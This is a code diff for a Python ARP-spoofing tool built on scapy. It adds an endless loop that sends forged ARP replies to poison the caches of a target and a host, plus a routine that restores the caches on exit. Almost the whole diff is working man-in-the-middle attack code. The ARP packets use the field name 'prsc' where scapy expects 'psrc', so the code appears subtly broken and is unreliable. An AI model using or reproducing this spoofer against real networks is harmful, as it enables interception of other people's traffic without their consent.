@@ -7,59 +7,49 @@ from resources.services import DeviceInfo
 
 """
 ----  TO DO:  ----
-def restore_cache();
 def enable_ip_route();
-main loop;
 """
 
 def ScapyArpSpoofer(target, host, verbose):
 
-    def get_default_gateway():
-        try:
-            """sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.connect(('8.8.8.8', 80))
-            gateway_ip = sock.getsockname()
-            print(gateway_ip)
-            sock.close()"""
-
-            """ipconfig = subprocess.check_output("ipconfig")
-            print(ipconfig)
-            default_gateway = re.findall("Gateway", ipconfig)
-            print(default_gateway)"""
-
-            gw = scapy.conf.route.route("0.0.0.0")[2]
-            print(gw)
-
-            return gw
-        
-        except Exception as e:
-            print(f"[bold red][!] ERROR: {str(e)}[/bold red]")
-
-
     def spoofer(target, host):
-        packet = scapy.ARP(op=2, pdst=target, hwdst=di.get_mac(target), prsc=host)
-        
+        packet = scapy.ARP(op=2, pdst=target, hwdst=info.get_mac(target), prsc=host)
+        scapy.send(packet, verbose=False)
+
+
+    def restore_cache(target, host):
+        target_mac = info.get_mac(target)
+        host_mac = info.get_mac(host)
+
+        packet = scapy.ARP(op=2, pdst=target, hwdst=target_mac, prsc=host, hwsrc=host_mac)
         scapy.send(packet, verbose=False)
 
 
     try:
+        info = DeviceInfo()
         packets_count = 0
+
         while True:
             spoofer(target, host)
             spoofer(host, target)
-
             packets_count = packets_count + 2
-            print(f"Packets sent: {packets_count}")
+
+            if verbose:
+                print(f"[bold green][+][/bold green] Packets sent: [green]{packets_count}[/green]")
+
             time.sleep(1)
     
     except KeyboardInterrupt:
+        restore_cache(target, host)
+        restore_cache(host, target)
+        print(f"[bold green][+][/bold green] Cache restored.")
         sys.exit()
 
     except Exception as e:
         print(f"[bold red][!] ERROR: {str(e)}[/bold red]")
         sys.exit(1)
 
-di = DeviceInfo()
+
 
 if __name__ == '__main__':
-    print(di.get_mac("192.168.5.132"))
+    pass
